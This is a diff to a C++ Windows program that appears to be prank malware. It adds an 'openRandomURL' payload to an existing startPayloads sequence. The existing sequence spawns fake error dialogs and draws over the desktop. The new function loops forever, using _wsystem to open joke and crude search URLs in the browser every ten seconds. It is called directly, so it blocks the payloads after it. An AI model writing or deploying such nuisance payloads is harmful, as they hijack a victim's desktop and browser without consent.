@@ -26,15 +26,17 @@ SOFTWARE.
 #include "bytebeat.cpp"
 #include <windows.h>
 #include <windowsx.h>
+#include "random"
 
 #include "modules/INIReader.h" // reads the .INI file to check some settings
 //#include <iostream>
 #include <sstream>
 
 #include <Mmsystem.h>
-#include <mciapi.h>
+//#include <mciapi.h> for some reason, this was giving errors when compiling to x86
 //these two headers are already included in the <Windows.h> header
 
+#include <cstdlib>
 
 #include "final.cpp"
 #include "extras.cpp"
@@ -84,6 +86,20 @@ std::wstring getRandomImageFile() {
     return imageFiles[randomIndex];
 }
 
+std::wstring getRandomURL() { 
+    const std::array<std::wstring, 4> 
+    URLLinks = {
+         L"https://www.bing.com/search?q=sudo+on+windows", 
+         L"https://www.bing.com/search?q=is+google+better+than+bing", 
+         L"https://www.ask.com/web?q=skibidi%20gooning%204k%20nike%20pro", 
+         L"https://www.roblox.com/pt/discover/?Keyword=skibidi" 
+         }; 
+
+    int randomLink = random() % URLLinks.size();
+    return URLLinks[randomLink];
+         } 
+         
+
 // Then, modify the ded function to use this new function:
 void WINAPI ded(LPVOID lpVoid) {
     while (true) {
@@ -102,6 +118,14 @@ void WINAPI ded(LPVOID lpVoid) {
         ReleaseDC(GetDesktopWindow(), hdc);
     }
 }
+         void WINAPI openRandomURL() { 
+            while (true) {
+            Sleep(10000);  // 10 seconds
+            std::wstring url = getRandomURL(); 
+            std::wstring command = L"start " + url; 
+            _wsystem(command.c_str()); 
+            }
+         }
 
 void WINAPI REALded(LPVOID lpVoid) {
     // consider it as an ded v2
@@ -1940,7 +1964,10 @@ void startPayloads() {
     Sleep(random() % 3000 + 2400);
 	thread = CreateThread(0, 0, FakeError, 0, 0, &ID);
 
-    Sleep(random() % 5000 + 340);
+    Sleep(random() % 30000 + 2400);
+	openRandomURL();
+
+    Sleep(random() % 50000 + 340);
     thread = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)msgXD, 0, 0, &ID);
     Sleep(random() % 500 + 340);
     thread = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)ded, 0, 0, &ID);
